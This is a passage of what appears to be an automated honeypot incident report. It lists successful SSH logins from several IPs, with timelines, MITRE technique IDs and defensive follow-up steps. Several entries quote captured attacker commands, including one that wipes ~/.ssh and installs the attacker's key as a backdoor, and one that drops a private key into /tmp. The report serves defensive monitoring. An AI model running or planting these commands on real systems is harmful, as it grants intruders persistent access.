| `2026-09-24 15:27:17` | `cowrie.direct-tcpip.request` |
| `2026-09-24 15:27:17` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 15:27:17` | `cowrie.direct-tcpip.data` |
| `2026-09-24 15:27:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51d3c8e26a75

| Field | Detail |
|---|---|
| **Source IP** | `5.165.19[.]3` |
| **First Seen** | 2026-09-24 15:34 |
| **Last Seen** | 2026-09-24 15:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 15:34:27` | `cowrie.session.connect` |
| `2026-09-24 15:34:27` | `cowrie.client.version` |
| `2026-09-24 15:34:27` | `cowrie.client.kex` |
| `2026-09-24 15:34:28` | `cowrie.login.success` |
| `2026-09-24 15:34:29` | `cowrie.session.params` |
| `2026-09-24 15:34:29` | `cowrie.command.input` |
| `2026-09-24 15:34:29` | `cowrie.command.failed` |
| `2026-09-24 15:34:29` | `cowrie.log.closed` |
| `2026-09-24 15:34:30` | `cowrie.session.params` |
| `2026-09-24 15:34:30` | `cowrie.command.input` |
| `2026-09-24 15:34:30` | `cowrie.session.file_download` |
| `2026-09-24 15:34:30` | `cowrie.log.closed` |
| `2026-09-24 15:34:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.165.19[.]3` to AbuseIPDB if not already reported
- [ ] Block `5.165.19[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9150878e962

| Field | Detail |
|---|---|
| **Source IP** | `5.165.19[.]3` |
| **First Seen** | 2026-09-24 15:34 |
| **Last Seen** | 2026-09-24 15:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 15:34:30` | `cowrie.session.connect` |
| `2026-09-24 15:34:30` | `cowrie.client.version` |
| `2026-09-24 15:34:30` | `cowrie.client.kex` |
| `2026-09-24 15:34:31` | `cowrie.login.success` |
| `2026-09-24 15:34:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.165.19[.]3` to AbuseIPDB if not already reported
- [ ] Block `5.165.19[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0e6350b139f

| Field | Detail |
|---|---|
| **Source IP** | `5.165.19[.]3` |
| **First Seen** | 2026-09-24 15:34 |
| **Last Seen** | 2026-09-24 15:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 15:34:31` | `cowrie.session.connect` |
| `2026-09-24 15:34:31` | `cowrie.client.version` |
| `2026-09-24 15:34:31` | `cowrie.client.kex` |
| `2026-09-24 15:34:32` | `cowrie.login.success` |
| `2026-09-24 15:34:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.165.19[.]3` to AbuseIPDB if not already reported
- [ ] Block `5.165.19[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-797c4ef9d801

| Field | Detail |
|---|---|
| **Source IP** | `103.48.192[.]48` |
| **First Seen** | 2026-09-24 15:58 |
| **Last Seen** | 2026-09-24 15:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 15:58:30` | `cowrie.session.connect` |
| `2026-09-24 15:58:30` | `cowrie.client.version` |
| `2026-09-24 15:58:30` | `cowrie.client.kex` |
| `2026-09-24 15:58:31` | `cowrie.login.success` |
| `2026-09-24 15:58:32` | `cowrie.session.params` |
| `2026-09-24 15:58:32` | `cowrie.command.input` |
| `2026-09-24 15:58:32` | `cowrie.command.failed` |
| `2026-09-24 15:58:33` | `cowrie.log.closed` |
| `2026-09-24 15:58:34` | `cowrie.session.params` |
| `2026-09-24 15:58:34` | `cowrie.command.input` |
| `2026-09-24 15:58:34` | `cowrie.session.file_download` |
| `2026-09-24 15:58:34` | `cowrie.log.closed` |
| `2026-09-24 15:58:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.48.192[.]48` to AbuseIPDB if not already reported
- [ ] Block `103.48.192[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-165ca5f6393e

| Field | Detail |
|---|---|
| **Source IP** | `103.48.192[.]48` |
| **First Seen** | 2026-09-24 15:58 |
| **Last Seen** | 2026-09-24 15:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 15:58:35` | `cowrie.session.connect` |
| `2026-09-24 15:58:35` | `cowrie.client.version` |
| `2026-09-24 15:58:35` | `cowrie.client.kex` |
| `2026-09-24 15:58:36` | `cowrie.login.success` |
| `2026-09-24 15:58:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.48.192[.]48` to AbuseIPDB if not already reported
- [ ] Block `103.48.192[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc4ed2adb1f3

| Field | Detail |
|---|---|
| **Source IP** | `103.48.192[.]48` |
| **First Seen** | 2026-09-24 15:58 |
| **Last Seen** | 2026-09-24 15:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 15:58:37` | `cowrie.session.connect` |
| `2026-09-24 15:58:37` | `cowrie.client.version` |
| `2026-09-24 15:58:37` | `cowrie.client.kex` |
| `2026-09-24 15:58:38` | `cowrie.login.success` |
| `2026-09-24 15:58:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.48.192[.]48` to AbuseIPDB if not already reported
- [ ] Block `103.48.192[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-565bee8cbb0f

| Field | Detail |
|---|---|
| **Source IP** | `39.109.116[.]214` |
| **First Seen** | 2026-09-24 16:01 |
| **Last Seen** | 2026-09-24 16:01 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:01:39` | `cowrie.session.connect` |
| `2026-09-24 16:01:39` | `cowrie.client.version` |
| `2026-09-24 16:01:48` | `cowrie.client.kex` |
| `2026-09-24 16:01:52` | `cowrie.login.success` |
| `2026-09-24 16:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.109.116[.]214` to AbuseIPDB if not already reported
- [ ] Block `39.109.116[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a94ed83850e8

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-09-24 16:01 |
| **Last Seen** | 2026-09-24 16:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:01:52` | `cowrie.session.connect` |
| `2026-09-24 16:01:52` | `cowrie.client.version` |
| `2026-09-24 16:01:52` | `cowrie.client.kex` |
| `2026-09-24 16:01:53` | `cowrie.login.success` |
| `2026-09-24 16:01:54` | `cowrie.session.params` |
| `2026-09-24 16:01:54` | `cowrie.command.input` |
| `2026-09-24 16:01:54` | `cowrie.session.file_download` |
| `2026-09-24 16:01:54` | `cowrie.session.file_download` |
| `2026-09-24 16:01:54` | `cowrie.log.closed` |
| `2026-09-24 16:01:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3caa3e8992d6

| Field | Detail |
|---|---|
| **Source IP** | `50.6.22[.]225` |
| **First Seen** | 2026-09-24 16:14 |
| **Last Seen** | 2026-09-24 16:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:14:18` | `cowrie.session.connect` |
| `2026-09-24 16:14:18` | `cowrie.client.version` |
| `2026-09-24 16:14:18` | `cowrie.client.kex` |
| `2026-09-24 16:14:18` | `cowrie.login.success` |
| `2026-09-24 16:14:19` | `cowrie.session.params` |
| `2026-09-24 16:14:19` | `cowrie.command.input` |
| `2026-09-24 16:14:19` | `cowrie.command.failed` |
| `2026-09-24 16:14:19` | `cowrie.log.closed` |
| `2026-09-24 16:14:19` | `cowrie.session.params` |
| `2026-09-24 16:14:19` | `cowrie.command.input` |
| `2026-09-24 16:14:20` | `cowrie.session.file_download` |
| `2026-09-24 16:14:20` | `cowrie.log.closed` |
| `2026-09-24 16:14:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.22[.]225` to AbuseIPDB if not already reported
- [ ] Block `50.6.22[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adf2dd7629d4

| Field | Detail |
|---|---|
| **Source IP** | `50.6.22[.]225` |
| **First Seen** | 2026-09-24 16:14 |
| **Last Seen** | 2026-09-24 16:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:14:20` | `cowrie.session.connect` |
| `2026-09-24 16:14:20` | `cowrie.client.version` |
| `2026-09-24 16:14:20` | `cowrie.client.kex` |
| `2026-09-24 16:14:20` | `cowrie.login.success` |
| `2026-09-24 16:14:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.22[.]225` to AbuseIPDB if not already reported
- [ ] Block `50.6.22[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ccfdc32ce51

| Field | Detail |
|---|---|
| **Source IP** | `50.6.22[.]225` |
| **First Seen** | 2026-09-24 16:14 |
| **Last Seen** | 2026-09-24 16:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:14:20` | `cowrie.session.connect` |
| `2026-09-24 16:14:20` | `cowrie.client.version` |
| `2026-09-24 16:14:20` | `cowrie.client.kex` |
| `2026-09-24 16:14:20` | `cowrie.login.success` |
| `2026-09-24 16:14:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.22[.]225` to AbuseIPDB if not already reported
- [ ] Block `50.6.22[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28294e53131e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-24 16:17 |
| **Last Seen** | 2026-09-24 16:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:17:52` | `cowrie.session.connect` |
| `2026-09-24 16:17:52` | `cowrie.client.version` |
| `2026-09-24 16:17:52` | `cowrie.client.kex` |
| `2026-09-24 16:17:53` | `cowrie.login.success` |
| `2026-09-24 16:17:53` | `cowrie.direct-tcpip.request` |
| `2026-09-24 16:17:53` | `cowrie.direct-tcpip.data` |
| `2026-09-24 16:17:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-672439e066e7

| Field | Detail |
|---|---|
| **Source IP** | `34.14.122[.]221` |
| **First Seen** | 2026-09-24 16:19 |
| **Last Seen** | 2026-09-24 16:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:19:14` | `cowrie.session.connect` |
| `2026-09-24 16:19:14` | `cowrie.client.version` |
| `2026-09-24 16:19:14` | `cowrie.client.kex` |
| `2026-09-24 16:19:14` | `cowrie.login.success` |
| `2026-09-24 16:19:15` | `cowrie.session.params` |
| `2026-09-24 16:19:15` | `cowrie.command.input` |
| `2026-09-24 16:19:15` | `cowrie.command.failed` |
| `2026-09-24 16:19:15` | `cowrie.log.closed` |
| `2026-09-24 16:19:16` | `cowrie.session.params` |
| `2026-09-24 16:19:16` | `cowrie.command.input` |
| `2026-09-24 16:19:16` | `cowrie.session.file_download` |
| `2026-09-24 16:19:16` | `cowrie.log.closed` |
| `2026-09-24 16:19:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.14.122[.]221` to AbuseIPDB if not already reported
- [ ] Block `34.14.122[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71aa42e9c418

| Field | Detail |
|---|---|
| **Source IP** | `201.17.133[.]138` |
| **First Seen** | 2026-09-24 16:19 |
| **Last Seen** | 2026-09-24 16:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:19:15` | `cowrie.session.connect` |
| `2026-09-24 16:19:15` | `cowrie.client.version` |
| `2026-09-24 16:19:15` | `cowrie.client.kex` |
| `2026-09-24 16:19:16` | `cowrie.login.success` |
| `2026-09-24 16:19:17` | `cowrie.session.params` |
| `2026-09-24 16:19:17` | `cowrie.command.input` |
| `2026-09-24 16:19:17` | `cowrie.command.failed` |
| `2026-09-24 16:19:18` | `cowrie.log.closed` |
| `2026-09-24 16:19:18` | `cowrie.session.params` |
| `2026-09-24 16:19:18` | `cowrie.command.input` |
| `2026-09-24 16:19:18` | `cowrie.session.file_download` |
| `2026-09-24 16:19:18` | `cowrie.log.closed` |
| `2026-09-24 16:19:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.17.133[.]138` to AbuseIPDB if not already reported
- [ ] Block `201.17.133[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa05ab5615b1

| Field | Detail |
|---|---|
| **Source IP** | `34.14.122[.]221` |
| **First Seen** | 2026-09-24 16:19 |
| **Last Seen** | 2026-09-24 16:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:19:16` | `cowrie.session.connect` |
| `2026-09-24 16:19:16` | `cowrie.client.version` |
| `2026-09-24 16:19:16` | `cowrie.client.kex` |
| `2026-09-24 16:19:17` | `cowrie.login.success` |
| `2026-09-24 16:19:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.14.122[.]221` to AbuseIPDB if not already reported
- [ ] Block `34.14.122[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51f9290a1801

| Field | Detail |
|---|---|
| **Source IP** | `34.14.122[.]221` |
| **First Seen** | 2026-09-24 16:19 |
| **Last Seen** | 2026-09-24 16:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:19:17` | `cowrie.session.connect` |
| `2026-09-24 16:19:17` | `cowrie.client.version` |
| `2026-09-24 16:19:17` | `cowrie.client.kex` |
| `2026-09-24 16:19:18` | `cowrie.login.success` |
| `2026-09-24 16:19:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.14.122[.]221` to AbuseIPDB if not already reported
- [ ] Block `34.14.122[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-525e27996bde

| Field | Detail |
|---|---|
| **Source IP** | `201.17.133[.]138` |
| **First Seen** | 2026-09-24 16:19 |
| **Last Seen** | 2026-09-24 16:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:19:19` | `cowrie.session.connect` |
| `2026-09-24 16:19:19` | `cowrie.client.version` |
| `2026-09-24 16:19:19` | `cowrie.client.kex` |
| `2026-09-24 16:19:19` | `cowrie.login.success` |
| `2026-09-24 16:19:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.17.133[.]138` to AbuseIPDB if not already reported
- [ ] Block `201.17.133[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-368d8ceba8dc

| Field | Detail |
|---|---|
| **Source IP** | `201.17.133[.]138` |
| **First Seen** | 2026-09-24 16:19 |
| **Last Seen** | 2026-09-24 16:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:19:20` | `cowrie.session.connect` |
| `2026-09-24 16:19:20` | `cowrie.client.version` |
| `2026-09-24 16:19:20` | `cowrie.client.kex` |
| `2026-09-24 16:19:20` | `cowrie.login.success` |
| `2026-09-24 16:19:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.17.133[.]138` to AbuseIPDB if not already reported
- [ ] Block `201.17.133[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d562fbc9060

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-09-24 16:20 |
| **Last Seen** | 2026-09-24 16:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:20:31` | `cowrie.session.connect` |
| `2026-09-24 16:20:31` | `cowrie.client.version` |
| `2026-09-24 16:20:32` | `cowrie.client.kex` |
| `2026-09-24 16:20:32` | `cowrie.login.success` |
| `2026-09-24 16:20:33` | `cowrie.session.params` |
| `2026-09-24 16:20:33` | `cowrie.command.input` |
| `2026-09-24 16:20:33` | `cowrie.command.failed` |
| `2026-09-24 16:20:34` | `cowrie.log.closed` |
| `2026-09-24 16:20:35` | `cowrie.session.params` |
| `2026-09-24 16:20:35` | `cowrie.command.input` |
| `2026-09-24 16:20:35` | `cowrie.session.file_download` |
| `2026-09-24 16:20:35` | `cowrie.log.closed` |
| `2026-09-24 16:20:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-923f5e096a70

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-09-24 16:20 |
| **Last Seen** | 2026-09-24 16:20 |
